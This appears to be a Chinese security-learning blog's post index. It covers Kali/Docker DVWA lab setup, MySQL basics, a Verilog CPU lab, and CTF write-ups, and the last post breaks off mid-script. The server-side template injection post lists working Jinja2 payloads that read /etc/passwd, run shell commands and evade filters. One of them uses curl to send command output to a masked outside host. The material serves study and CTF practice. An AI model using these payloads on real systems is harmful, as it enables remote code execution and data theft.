http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib#阿里云#deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib#deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib#清华大学#deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free#deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free#浙大#deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free#deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free#东软大学#deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib#deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib#重庆大学#deb http://http.kali.org/kali kali-rolling main non-free contrib#deb-src http://http.kali.org/kali kali-rolling main non-free contrib\n\n感谢CSDN博主「卑微的那菈」整理的2022年全新kali国内源 KALI更换国内源（2022年全新）\n这里我使用的是中科大的源\n\n\n之后更新apt源即可。\nsudo apt-get update\n\nDocker安装和验证sudo apt-get install -y docker docker-compose   # 安装docker和docker-compose，-y表示默认全部yes\n\n待安装完成后，可用以下命令查看版本信息，以验证docker是否安装成功。\ndocker --version # 查看版本docker-compose --version # 查看版本\n\n\n\n启停管理sudo systemctl start/stop/restart docker # 启动、停止、重启docker\n\n通过以上命令即可以实现Docker的启停。\n配置加速器使用Docker的时候，需要经常从官方获取镜像，但是由于网络原因，拉取镜像的过程非常耗时，严重影响Docker的使用。因此可以通过配置加速器来解决。\n# 添加一个daemon.jsonsudo vim /etc/docker/daemon.json# 将以下镜像注册copy进daemon.json中&#123; &quot;registry-mirrors&quot;: [    &quot;https://dockerhub.azk8s.cn&quot;,    &quot;https://reg-mirror.qiniu.com&quot;,    &quot;https://1rqfztnd.mirror.aliyuncs.com&quot;  ]&#125;\n\n写入daemon.json文件后，下面使加速器生效。\nsudo systemctl daemon-reload  # 重新加载配置文件sudo systemctl restart docker # 重启docker\n\nDocker安装、运行DVWA靶场sudo docker search dvwa # 搜索DVWAsudo docker pull citizenstig/dvwa # 拉取安装指定dvwasudo docker run --rm --name dvwa -it -p 8888:80 citizenstig/dvwa  # docker运行dvwanetstat -ntulp | grep 8888  # 查看容器指定端口是否被打开访问 http://localhost:8888 进行dvwa的访问\n\n\n注：容器在运行时会生成一个镜像，镜像在生成后会处于几种状态：运行中和已停止，--rm命令使镜像在停止之后自动删除。需要保留镜像时就可以不加该参数；--name dvwa为镜像起名为dvwa；-p可理解为端口的映射，即把外部的8888端口映射镜像的80端口，通过访问外部8888端口，即可访问到80端口。\n\n\n\n","categories":["渗透：从0到1"],"tags":["web","渗透"]},{"title":"数据库基础","url":"/2022/12/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/","content":"数据库(database)就是一个由一批数据构成的有序集合，这个集合通常被保存为一个或多个彼此相关的文件。通俗的讲，数据库就是软件存放数据的一个空间，而数据中有很多都是有关联的。用户可以对文件的数据进行新增、截取、更新、删除等操作。\n\n数据库数据库管理系统(DBMS)数据库管理系统（DBMS, 后面简称数据库）是一种操纵和管理数据库的软件，用于建立、使用和维护数据库。它对数据库进行统一的管理和控制，以保证数据库的安全性和完整性。\n数据库主要分为两类：关系型数据库和非关系型数据库\n关系型数据库：存储格式能直观反映实体间的关系，和创建的表格比较相似，表与表之间有着复杂的关联关系。有MySQL, Oracle, Microsoft SQL Server, Access等。\n\n举个例子，通过Stuuupid这个用户，可以将他的“个人信息”“博客信息”“联系方式”这三张表的数据关联起来，那么就可以把这个用户Stuuupid这个用户作为关键点，把上述其他三张表的数据一起查出来。这就是关系型数据库。\n\n非关系型数据库：分布式、非关系型的、不保证遵循ACID原则的数据存储系统。有MongoDB, Redis, HBase等。\nSQL基础SQL(Structured Query Language) , 结构化查询语言，这种语言已发展为人们在构造数据库查询命令的一个标准。\n查询是人们用各种SQL指令构造出来的，SQL指令负责具体完成筛选和提取结果数据的工作。基本的指令如增、删、改、查等。\nMySQL基础数据库结构\n\n数据库中的数据是存储在数据库表中，如上图为数据库的基本表结构（类似Excel表格），每一个不同的表汇总起来就构成一个数据库。\n数据类型MySQL中定义数据字段的类型对数据库的优化是非常重要的。\nMySQL支持多种数据类型，大致可以分为三类：数值、日期&#x2F;时间和字符(串)类型。\n数值类型包括小整数值、大整数值(INT) 、极大整数值、单精度浮点数值(FLOAT) 、双精度浮点数值(DOUBLE) 、小数值等。\n\n日期&#x2F;时间类型\n\n\n类型\n大小(bytes)\n范围\n格式\n用途\n\n\n\nDATE\n3\n1000-01-01&#x2F;9999-12-31\nYYYY-MM-DD\n日期值\n\n\nTIME\n3\n‘-838:59:59’&#x2F;‘838:59:59’\nHH:MM:SS\n时间值或持续时间\n\n\nYEAR\n1\n1901&#x2F;2155\nYYYY\n年份值\n\n\nDATETIME\n8\n1000-01-01 00:00:00&#x2F;9999-12-31 23:59:59\nYYYY-MM-DD HH:MM:SS\n混合日期和时间值\n\n\nTIMESTAMP\n4\n1970-01-01 00:00:00&#x2F;2038结束时间是第 2147483647 秒，北京时间 2038-1-19 11:14:07，格林尼治时间 2038年1月19日 凌晨03:14:07\nYYYYMMDD HHMMSS\n混合日期和时间值，时间戳\n\n\n字符(串)类型\n尤其需要记住的是定长字符串(CHAR)和变长字符串(VARCHAR)\nMySQL约束类型约束，对表中的数据进行限定，保证数据的正确性、有效性、完整性。\n\n1 主键约束(primary key)：保证该字段具有非空且唯一性，一张表中只能有一个主键，主键是表中字段的唯一标识。\n\n主键约束 是使用最频繁的约束。在设计数据表时，一般情况下，都会要求表中设置一个主键。主键是表的一个特殊字段，该字段能唯一标识该表中的每条信息。例如，学生信息表中的学号是唯一的。\n单一主键使用一个列作为主键列，当该列的值有重复时，则违反唯一约束。\n联合主键使用多个列作为主键列，当多个列的值都完全相同时，则违反唯一约束。\n主键自增长MySQL 中的自动增长类型要求：1.一个表中只能有一个列为自动增长。2.自动增长的列的类型必须是整数类型。3.自动增长只能添加到具备主键约束与唯一性约束的列上。4.删除主键约束或唯一性约束，如果该列拥有自动增长能力，则需要先去掉自动增长然后在删除约束。\nalter table &lt;table_name&gt; add primary key(&lt;列字段名&gt;)alter table &lt;table_name&gt; drop primary key\n\n\n\n2 非空约束(not null)：保证字段不能为空\n\nalter table &lt;table_name&gt; change column &lt;字段名&gt; &lt;数据类型&gt; not NULL\n\n\n3 唯一约束(unique)：保证该字段具有唯一性但可以是null\n\nalter table &lt;table_name&gt; add constraint &lt;约束名&gt; unique(&lt;列名&gt;)alter table &lt;table_name&gt; drop key &lt;约束名&gt;\n\n\n\n4 外键约束(foreign key)：在一个表中存在的另一个表的主键或唯一键\n\n外键约束经常和主键约束一起使用，用来确保数据的一致性。\nalter table &lt;table_name&gt; add constraint &lt;外键名&gt; foreign key(&lt;列名&gt;) references &lt;参照的表名&gt;(&lt;参照的列名&gt;)alter table &lt;table_name&gt; drop foreign key &lt;外键名&gt;\n\n\n5 默认约束(default+默认值)：用于保证该字段有默认值(用引号引起来)\n\nALTER TABLE &lt;数据表名&gt;CHANGE COLUMN &lt;字段名&gt; &lt;数据类型&gt; DEFAULT &lt;默认值&gt;\n\n详细学习可以去其他网站寻找教程。\n常见的MySQL语句\n连接到数据库mysql -uroot -p\n\n-u后加用户名，-p表示需要输入密码，enter输入密码即可成功连接到MySQL。\n\n查看所有的数据库\nshow databases; // 注意加分号;表示该句结束\n\n创建数据库\ncreate database &lt;库名&gt;;\n\n删除数据库\ndrop database &lt;库名&gt;;\n\n查看当前数据库的表\nuse &lt;库名&gt;  // 指定数据库show tables;\n\n查看某个表的字段描述\ndesc &lt;表名&gt;;\n\n增、删、改、查\n增// 插入数据insert into &lt;表名&gt;(&lt;字段1&gt;, &lt;字段2&gt;...) values(&lt;值1&gt;,&lt;值2&gt;...);// 插入多条数据insert into &lt;表名&gt;(&lt;字段1&gt;, &lt;字段2&gt;...) values(&lt;值01&gt;,&lt;值02&gt;...),(&lt;值11&gt;,&lt;值12&gt;...);\n改update &lt;表名&gt; set &lt;字段名&gt;=&lt;修改值&gt; where &lt;条件&gt;;update &lt;表名&gt; set &lt;字段名&gt;=&lt;修改值&gt; where &lt;字段名&gt;=&lt;值&gt;;// 例:将字段id=460061的那条数据的字段name的值修改为&#x27;Alen&#x27;// update students set name=&#x27;Alen&#x27; where id = 460061;\n\n这里相当于用 where 来索引要去修改的地方，where 后面为条件。\n\n\n\n删数据库中的删除：delete 表示删除一条数据。指定物理删除，将数据从表中彻底抹除。除此之外，还有逻辑删除，用户看起来删掉了，但实际上该数据仍在存在于数据库中，只是不显示而已。逻辑删除通常通过update 修改某个字段的值来实现。\ndelete from &lt;表名&gt; where &lt;条件&gt;;\n\n查\nselect * from &lt;表名&gt; [where &lt;条件&gt;];  // where条件可选，若不加，则查询表中所有数据\n\n\n高级查询\n排序select * from &lt;表名&gt; order by &lt;字段名&gt; [asc];  //默认升序select * from &lt;表名&gt; order by &lt;字段名&gt; desc;    //降序\n\n\n\n另外，也可以不通过字段名来实现order by ，而是通过数字 表示第几个字段（第几列）来实现。\nselect * from &lt;表名&gt; order by 1;  //按第一列升序\n\n\n当后面的数字大于总字段数时，就会报错。可在“sql注入”中利用这一特性来判断表的字段数。\n\n\n\n\nLIMIT限制select * from &lt;表名&gt; LIMIT [&lt;偏移量&gt;, ]&lt;限制条数&gt;;// 例:检索前2个记录行，偏移量默认为1// select * from students LIMIT 2;// 例:检索记录行2-4// select * from students LIMIT 2,3;  //可以理解为从第二行开始，检索3个记录行\n\n注释符MySQL有三种注释方式:\n1. #2. --+ 或 --  //后面要加空格3. /**/\n\n其他操作版本信息\nselect version();select @@version;\n\n返回当前使用数据库的用户，也就是网站配置文件中连接数据库的账号\nselect user();\n\n连接数据库的用户名\nselect session_user();\n\n系统用户名\nselect system_user();\n\nMySQL特性information_schemaMySQL 5.0 以上版本自带 information_schema这个数据库，其保存着其他数据库的信息。\n\n\n关于这个数据库，后续会继续学习补充。\n","categories":["渗透：从0到1"],"tags":["web","渗透"]},{"title":"服务器端模板注入","url":"/2022/12/06/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/","content":"一、SSTI简介SSTI， 即 Server-Side Template Injection，服务器端模板注入。\n1、SSTI产生原因在MVC框架中，用户的输入通过 View 接收，交给 Controller ，然后由 Controller 调用 Model 或者其他的 Controller 进行处理，最后再返回给View ，这样就最终显示在我们的面前了，那么这里的 View 中就会大量地用到一种叫做模板的技术。绕过服务端接收了用户的恶意输入后，未经任何处理就将其作为web应用模板内容的一部分，而模板引擎在进行目标编译渲染的进程中，执行了用户恶意攻击者插入的可以破坏模板的语句，就会导致信息泄露、代码执行、GetShell等问题。\n\n网站模板引擎:模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这就大大提升了开发效率，良好的设计也使得代码重用变得更加容易。\n\n\n现行的模板引擎有:PHP 的     Smarty, Twig, Blade.Java 的    JSP, FreeMareker, Velocity.Python 的  Flask(Jinja2), django, tornado\n\n……\n简单来说，可以理解为利用模板引擎来生成前端的HTML代码。模板引擎会会提供一套生成HTML代码的程序，然后只需要获取用户的数据，将其放到渲染函数里，最后生成模板+用户数据的前端HTML页面，反馈给浏览器，从而呈现在用户面前。当这里的“用户的数据”具有恶意攻击性而又不被处理时，SSTI就发生了。\n2、SSTI检测工具 Tplmap\n工具地址: https://github.com/epinna/tplmap安装教程: https://www.cnblogs.com/ktsm/p/15691652.html使用教程: https://blog.csdn.net/EC_Carrot/article/details/109709767\n\n【参考资料：**详解SSTI模板注入**】\n二、SSTI 利用\n以Flask（Jinja2）为例（windows），该版块仅涉及主机上的python语法\n\nⅠ. 基础知识1、Python 内建函数启动 python 解释器时，即使没有创建任何变量或函数还是会有很多函数可供使用，这些就是 python 的内建函数。在 Python 交互模式下，使用命令 dir(&#39;builtins&#39;) 即可查看当前 Python 版本的一些内建变量、内建函数，内建函数可以调用一切函数。\n2、Python 类继承Python 中一切皆为对象，均继承于 object 对象，Python 中的 object 类中集成了很多的基础函数，假如需要在 payload 中使用某个函数就需要用 object 去操作。\n常见的继承关系有以下三种：\n1. base ：对象的一个基类，一般是object2. mro  ：获取对象的基类，只是这时会显示整个继承链的关系，是一个列表，而object在最列表的最顶层，通过mro[-1]可以获取到3. subclasses() : 继承此对象的子类，返回一个列表\n\nⅡ. 构造payload\n\n攻击方式为：变量-&gt;对象-&gt;基类-&gt;子类遍历-&gt;全局变量\n1、相关属性对于返回的是类实例：1. __class__            //返回实例的对象，可以使实例指向class，从而使用下面的魔术方法如：&gt;&gt;&gt;&#x27;&#x27;.__class__  &lt;class &#x27;str&#x27;&gt;对于返回的是定义的class类：2. __base__              //返回类的父亲 python33. __mro__               //返回类继承的元组，即寻找父类 python34. __subclasses__()      //返回类中仍然可用的引用，可以此获取想要的类的对象 python3如：&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[138]  &lt;class &#x27;os._wrap_close&#x27;&gt;   Tip：根据索引值来获取想用的可利用类,不加索引会输出全部存活的引用5. __builtins__          //作为默认初始模块出现，可用于查看当前所有导入的内建函数6. __globals__           //对包含函数全局变量的字典的引用。如果某个文件调用了os、sys等库，但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals属性访问全局的变量 python37. __init__              //返回类的初始化方法如：&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__[0].__subclasses__()[38].__init__&lt;slot wrapper &#x27;__init__&#x27; of &#x27;object&#x27; objects&gt;Tip: &#x27;wrapper&#x27;是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性\n\n2、一个简单的payload寻找过程Ⅰ. 找到__globals__全局根据上述属性，找到重载过的 __init__ 类（在获取初始化属性后，带 wrapper 的说明没有重载，因此寻找**不带 warpper** 的即可），并通过 __globals__ 全局来查找所有的方法及变量及参数，或者获取 file 、 os 等模块以进行下一步的利用。\n&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__[0].__subclasses__()[138].__init__&lt;function _wrap_close.__init__ at 0x0000025AA50BAEE0&gt;\n\nⅡ. 查看其引用__builtins__&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&#x27;__builtins__&#x27;]            Tip：这里会返回 dict 类型，寻找 keys 中可用函数，使用 keys 中的 file 等函数来实现读取文件的功能\n\n\nⅢ. 使用可利用函数实现文件读取功能等&#39;&#39;.__class__.__mro__[-1].__subclasses__()[138].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;/etc/passwd&#39;).read() \n3、常用的目标函数filesubprocess.Popenos.popenexeceval\n\n\n几个含有eval函数的类：warnings.catch_warningsWarningMessagecodecs.IncrementalEncodercodecs.IncrementalDecodercodecs.StreamReaderWriteros._wrap_closereprlib.Reprweakref.finalize……\n\n4、命令执行Python常用的三种命令执行方式：\n\nos.system()该方法的参数就是 string 类型的命令，在 linux 上返回值为执行命令的 exit 值；而windows上返回值则是运行命令后 shell 的返回值；注意：该函数返回命令执行结果的返回值，并不是返回命令的执行输出（执行成功返回0，失败返回-1），因此需要配合 curl 外带数据查看回显          #这里画个问号 \n\n\nos.popen()返回的是 file read 的对象，如果想获取执行命令的输出，则需要调用该对象的 read() 方法\n\n\n直接寻找 os 模块执行命令先编写脚本遍历Python中含有os模块的类的索引号，然后选取其中一个构造payload执行命令，脚本如下：\n\nimport requestsheaders = &#123;    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#x27;&#125;for i in range(500):    url = &quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__&#125;&#125;&quot;    res = requests.get(url=url, headers=headers)    if &#x27;os.py&#x27; in res.text:        print(i)\n\n\n\n用例:\n&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[138].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)Tip: 需要导入os模块&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[138].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;)Tip: 需要导入os模块&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[79].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;dir&#x27;).read()\n\n我们可以看到，即使是使用os模块执行命令，其也是调用的os模块中的popen函数，那我们也可以直接调用popen函数，存在popen函数的类一般是 os._wrap_close，但也不绝对。由于目标Python环境的不同，我们还需要遍历一下。\n\n事实上，在本地python环境下，可以直接在os._wrap_close找到popen函数：&#39;&#39;.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&#39;popen&#39;](&#39;dir&#39;).read()\n\n【参考资料：以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用】\n三、模板注入绕过1、语法官方文档对于模板的部分语法介绍如下（仍然以jinja2为例：Template Designer Documentation）\n\n1 基本语法\n\n&#123;% ... %&#125; for Statements 可用来声明变量，也可用以循环语句和条件语句&#123;&#123; ... &#125;&#125; for Expressions to print to the template output用于将表达式打印到模板输出&#123;# ... #&#125; for Comments not included in the template output表示未包含在模板输出中的注释#  ... # for Line Statements## 可以有和 &#123;%%&#125; 相同的效果\n\n2 dot(.)的绕过\n\nYou can use a dot (.) to access attributes of a variable in addition to the standard Python __getitem__ “subscript” syntax ([]). --官方原文可以用 . 或者 [] 来访问变量的属性，也就是说&#123;&#123;&quot;&quot;.__class__&#125;&#125;  等价于  &#123;&#123;&quot;&quot;[&#x27;__classs__&#x27;]&#125;&#125;\n因此，当.被过滤时，我们可以使用[]以绕过。\n\n3 如果想调用字典中的键值，其本质其实是调用了魔术方法__getitem__\n\n所以对于取字典中键值的情况不仅可以用[]，也可以用__getitem__\n&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;&#123;&#123;url_for.__globals__.__getitem__(&#x27;__builtins__&#x27;)&#125;&#125;\n\n4 调用对象的方法，具体是调用了魔术方法__getattribute__\n\n&quot;&quot;.__class__&quot;&quot;.__getattribute__(&quot;__class__&quot;)\n\n5 lipsumflask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：\n\n&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;#在CTF中很好用\n【参考资料：SSTI】\n2、绕过Ⅰ. 字符串1、拼接&quot;cla&quot;+&quot;ss&quot;\n2、反转&quot;__ssalc__&quot;[::-1]\n3、编码绕过（ASCII码、Unicode编码等）4、利用chr函数因为我们没法直接使用chr函数，所以需要通过__builtins__找到他\n&#123;% set chr=url_for.__globals__[&#x27;__builtins__&#x27;].chr %&#125;&#123;&#123;&quot;&quot;[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]&#125;&#125;  //%2b为 + ，拼接字符串==&gt;&#123;&#123;&quot;&quot;.__class__&#125;&#125;\n\n5、在jinja2里面可以利用~进行拼接\n&#123;%set a=&#x27;__cla&#x27; %&#125;&#123;%set b=&#x27;ss__&#x27;%&#125;&#123;&#123;&quot;&quot;[a~b]&#125;&#125;\n\n6、大小写过滤转换\nⅡ. 过滤器\n在模板中, 过滤器相当于一个函数, 把当前的变量传入到过滤器中, 然后过滤器根据自身功能, 再返回对应的值, 之后再把结果渲染到页面中基本语法: &#123;&#123; 变量 | 过滤器名称 &#125;&#125; 使用管道符号|进行组合，可以链接多个过滤器。一个过滤器的输出应用于下一个过滤器。\n\n常用的过滤器：\n1. attr#用于获取变量，可用于. [] 都被过滤的情况&quot;&quot;|attr(&quot;__class__&quot;) &lt;==&gt; &quot;&quot;.__class__2. format#格式化字符串&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)  &lt;==&gt;  &quot;__class__&quot;3. join#将一个序列拼接成一个字符串，join (&#x27;|&#x27;)将令每一个元素被&#x27;|&#x27;隔开&quot;&quot;[[&#x27;__clas&#x27;,&#x27;s__&#x27;]|join] 或者 &quot;&quot;[(&#x27;__clas&#x27;,&#x27;s__&#x27;)|join]&lt;==&gt;&quot;&quot;[&quot;__class__&quot;]4. lower#转换成小写5. replace#替换字符串&quot;__claee__&quot;|replace(&quot;ee&quot;,&quot;ss&quot;) 构造出字符串 &quot;__class__&quot;&quot;__ssalc__&quot;|reverse 构造出 &quot;__class__&quot;6. string#将变量转换为字符串，这样就可以通过浏览器显示的符号构造出我们可利用的字符串、符号等().__class__   出来的是&lt;class &#x27;tuple&#x27;&gt;().__class__|string)[0] 出来的是&lt;7. list#转换成列表，可以与上面的string配合，就可以调用列表里面的方法取字符了(()|select|string|list).pop(0)\n【资料查阅：SSTI模板注入绕过（进阶篇）】\nⅢ. 关键字绕过\n.和[]\n\n可用过滤器attr绕过，若.可用，还可以__getitem__绕过[]。\n\n\n&quot;&quot;和_绕过\n\nrequest.args、request.values、request.cookies 是 flask 中的属性，为返回请求的参数，这里把path当作变量名，将后面的路径传值进来进而绕过了引号的过滤\n\n\n\n&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125;&#125;&amp;path=/etc/passwd=&gt;&#123;&#123; &#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__\n\n\n&#123;&#123;&#125;&#125;绕过\n用&#123;%%&#125;的左半边绕过\n\n\n\n&#123;% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://xx.xxx.xx.xx:8080/?i=`whoami` ').read()=='p' %&#125;1&#123;% endif %&#125;\n四、SSTI检测1、Tplmap2、附表使用标志测试。如jinja2：&#123;&#123;7+8&#125;&#125;，如果输出15，则有可能存在SSTI漏洞。&lt;图源: https://www.cnblogs.com/icez/archive/2018/04/07/ssti_check_payload.html&gt;\n","categories":["渗透：从0到1"],"tags":["web","渗透","常见漏洞"]},{"title":"简易CPU的Verilog实现","url":"/2023/01/26/%E7%AE%80%E6%98%93CPU%E7%9A%84Verilog%E5%AE%9E%E7%8E%B0/","content":"本次实验需要实现一个 CPU 的运算器。简易运算器由三个 8 位寄存器（R0、R1、R2）和一个算术逻辑单元 (ALU) 构成，其中 ALU 应该至少支持加法、减法、乘法，与、或、或非、与非、比较的功能，输入由开关控制。\n\n实验任务及说明实验任务\n本次实验需要实现一个 CPU 的运算器。简易运算器由三个 8 位寄存器（R0、R1、R2）和一个算术逻辑单元 (ALU) 构成，其中 ALU 应该至少支持加法、减法、乘法，与、或、或非、与非、比较的功能。\n输入由开关控制；每一步运算后，相应标志位（标志位设置同实验四）的情况通过 LED 灯表示；运算结果以十进制通过数码管显示。读取数据的结果以十进制通过数码管显示。\n时钟信号、复位信号等控制信号允许用开关控制。\n\n\n注：1. 本次实验涉及的数据皆为补码。2. 实验说明给出的默认指令集由定长指令构成，其中指令的操作码为变长操作码。\n\n实验说明\n实验使用八位二进制串（b7b6b5b4b3b2b1b0）表示指令，与开发板上的八个开关对应。\n实验使用四位二进制补码作为输入，与开发板上的四个开关对应。\n三个寄存器 R0，R1，R2 分别对应二进制地址码 00,01,10.\n\n运算指令格式高四位 (b7b6b5b4) 为操作码，次低两位（b3b2）为地址码（指明存放第一个操作数的寄存器），最低两位 (b1b0) 为地址码（指明存放第二个操作数的寄存器）。\n\n注：运算结果始终默认存放至寄存器 R2 因此不在指令中显式指出。有符号乘法的结果若超过8 比特应当解释为溢出。\n\n操作码对应的运算操作由下表说明，其中 A 表示第一个操作数，B 表示第二个操作数。\n\n\n\n运算指令的操作码（b7b6b5b4）\n运算操作\n\n\n\n0000\nA &amp; B\n\n\n0001\nA | B\n\n\n0010\nA+B\n\n\n0110\nA-B\n\n\n0111\n有符号数比较\n\n\n1100\n∼(A\n\n\n1101\n∼(A &amp; B)\n\n\n1110\nA * B\n\n\n\n例：指令 0010-0001 表示计算寄存器 R0 的值加上寄存器 R1 的值。指令 0110-0110 表示计算寄存器 R1 的值减去寄存器 R2 的值。\n\n存储指令格式最高两位（b7b6）为操作码置 10，次高两位（b5b4）为写入寄存器的地址码，低四位（b3b2b1b0）为待写入数据的二进制补码。\n读取指令格式最高六位（b7b6b5b4b3b2）为操作码置 111100，最低两位（b1b0）为地址码置 10。要求该指令可读取寄存器 R2 的值并以十进制通过数码管显示。\n\n注：不强制要求支持读取并显示 R0，R1 寄存器的数据。\n\n实现过程数据通路的设计在简易CPU的基础上，进行了数据通路的设计，如下图所示\n\n\nCPU 实现在 Control、ALU、Reg 三个模块之上。其中 Control 模块用来处理来自开关的数据，获取使能信号；ALU 模块用来进行算术逻辑运算；Reg 模块用来处理数据的存储与读取。\nControl 模块的设计与实现如上文所言，Control 控制层需要接收来自开关的 opcode 指令，然后根据指令判断是否存入(EnWrite)、读取 (EnRead_single)、调用 ALU 运算 (alu)。同时，Control 模块还需要接收复位信号 (也就是这里的 Enter)，当 Enter 为 1 时，对已经完成输入的 opcde 进行处理，并返回 OP 指令，供后续模块调用；当 Enter 为 0 时，将所有使能信号置零，并且不输出 OP 指令。实现代码如下：\n\n","categories":["计算机组成与设计"],"tags":["CPU","计算机组成与设计"]},{"title":"集训WriteUp-1","url":"/2023/01/13/%E9%9B%86%E8%AE%ADWriteUp-1/","content":"2023-01-10 WP\nT1 [hgame 2023]Classic Childhood Game题目地址\n兔兔最近迷上了一个纯前端实现的网页小游戏，但是好像有点难玩，快帮兔兔通关游戏！进去连第二关都关不了，烦死啦。这种游戏类的题目往往会让Flag在游戏通关后呈现，而这道纯前端实现的小游戏，Flag就很有可能就藏到了js代码里。\n我们检查查看脚本，找到关卡Events.js，直接看到最后一关\n\n\n在“通关”的提示后，调用了一个叫mota()函数，里面存在可疑变量a，可能是flag\nvar a = [&#x27;\\x59\\x55\\x64\\x6b\\x61\\x47\\x4a\\x58\\x56\\x6a\\x64\\x61\\x62\\x46\\x5a\\x31\\x59\\x6d\\x35\\x73\\x53\\x31\\x6c\\x59\\x57\\x6d\\x68\\x6a\\x4d\\x6b\\x35\\x35\\x59\\x56\\x68\\x43\\x4d\\x45\\x70\\x72\\x57\\x6a\\x46\\x69\\x62\\x54\\x55\\x31\\x56\\x46\\x52\\x43\\x4d\\x46\\x6c\\x56\\x59\\x7a\\x42\\x69\\x56\\x31\\x59\\x35&#x27;]\n\n我们对其Hex转ASCII码，得到一个像是Base64编码的东西\nYUdkaGJXVjdabFZ1Ym5sS1lYWmhjMk55YVhCMEprWjFibTU1VFRCMFlVYzBiV1Y5\n\n我们继续对其转换，其结果仍是Base64编码，再转换一次就得到Flag\n\n\n\n也可以直接在控制台执行mota()函数，秒杀。\n\nT2 [hgame 2023]Become A Member题目地址\n要求我们“提供一下身份证明（Cute-Bunny）”，考察HTTP知识。我们抓包看一下\n\n\n可以看到响应包头部信息Set-Cookie中设置code=guest，我们要成为会员，可能要修改这个值，但是不知道修改成什么，数次尝试无果，考虑修改User-Agent为他给定的Cute-Bunny\n\n\n告诉我们需要“持有名为Vidar的邀请码（code）”，在cookie中添加code=Vidar，访问后告知我们“由于特殊原因，我们只接收来自于bunnybunnybunny.com的会员资格申请”，这里只需要再添加Referer:bunnybunnybunny.com即可，最后根据提示添加本地请求X-Forwarded-For:127.0.0.1，拿到会员账号\nusername:luckytoday password:happy123（请以json请求方式登陆）\n\n注意json格式提交数据，成功拿到flag，最终请求包如下：\nGET / HTTP/1.1Host: week-1.hgame.lwsec.cn:31906Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUser-Agent: Cute-Bunny              # 修改代理Cookie:code=Vidar                   # 修改cookieX-Forwarded-For:127.0.0.1           # 添加 HTTP请求端真实IP 为本地Referer:bunnybunnybunny.com         # 修改访问来源Content-Type:application/json       # 修改数据格式为jsonContent-Length: 59                                    # 请求头部后面的空行是必须要有的&#123;                                   # json格式数据\t&quot;username&quot;:&quot;luckytoday&quot;,\t&quot;password&quot;:&quot;happy123&quot;&#125;\n\n\nHttp协议&#x2F;JSON格式\n\n2023-01-14 WP\nT3 [hgame 2023]Guess Who I Am题目地址\n爬虫题，写脚本答对100题就行了。由于题目Question、Score信息是由js渲染后呈现，其过程大概是请求网页，由getQuestion和getScore分别创建cookie，生成session返回给客户端，然后客户端带着session信息再去请求getQuestion和getScore分别获取Question和Score，然后以POST请求的方式发送id到verifyAnswer判断回答是否正确，若正确，则在响应包set-cookie修改session值，发回给客户端。\n\n\n因此要做到100分，要么我们能直接对session进行修改，因为加了密，这一点显然没法实现；要么就只能每次获取cookie，然后修改cookie，模拟其过程。我最初想尝试这种做法，但是因为没有请求到getQuestion和getScore，而没有获取到cookie，就放弃了（这也是后来再分析的时候弄明白的）。后面再对这种方法的实现做补充。\nPython + Selenium 方法这里用Python + Selenium方法登录网页，借助browser实现数据的抓取和发送，以及模拟点击等，脚本如下：\nimport timefrom selenium import webdriverfrom selenium.webdriver.common.by import Byimport redef getDict(filename):    f = open(filename, encoding=&#x27;utf-8&#x27;)    data = f.read()    id_re = 